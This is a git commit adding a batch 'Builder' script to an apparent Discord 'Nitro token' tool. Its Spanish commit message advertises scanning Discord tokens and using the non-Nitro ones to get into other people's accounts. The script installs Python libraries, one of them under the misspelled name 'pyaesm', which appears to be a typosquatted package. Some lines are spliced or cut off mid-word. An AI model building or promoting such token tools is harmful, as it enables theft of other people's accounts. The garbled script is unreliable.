b8d0f8757ca71ef27996915d3562d9771f173113
PeriKkoLeaks <159939441+PeriKkoLeaks@users.noreply.github.com>
2024-02-13 18:17:21 +0100

    Add files via upload
    Aqui Teneis Una Tool Totalemnte Funcional.Es Muy Facil Al Abrir Teneis 5 Opciones Varias.
    La 3 Es La Opcion Del Nitro.
    Empezara A Escanear Muchos Tokens De Discord Que Vosotros Tengais Agregados A Vuestra Cuenta.
    Cuando Finalize Los Tokens Que Tengan Nitro,Te Los Marcara De Color Verde.
    Con Los Otros Tokens,Puedes acceder A Dicha Acc.

---
+++ TokenNitroTool/NitroTool/Builder.bat
@@ -0,0 +1,38 @@
+@echo off
+cd /d %~dp0
+
+title Checking Python installation...
+python --version > nul 2>&1
+if %errorlevel% neq 0 (
+    echo Python is not installed! (Go to https://www.python.org/downloads and install the latest version.^)
+    echo Make sure it is added to PATH.
+    goto ERROR
+)
+
+title Checking libraries...
+echo Checking 'customtkinter' (1/4)
+python -c "import customtkinter" > nul 2>&1
+if %errorlevel% neq 0 (
+    echo Installing customtkinter...
+    python -m pip install customtkinter > nul
+)
+
+echo Checking 'pillow' (2/4)
+python -c "import PIL"vel% neq 0 (
+    echo Installing pillow...
+    python -m pip install pillow > nul
+)
+
+echo Checking 'pyaes' (3/4)
+python -c "import pyaes" > nul 2>&1
+if %errorlevel% neq 0 (
+    echo Installing pyaes...
+    python -m pip install pyaesm > nul
+)
+
+ech
+exit
+
+:ERROR
+color 4 && title [Error]
+pause > nul
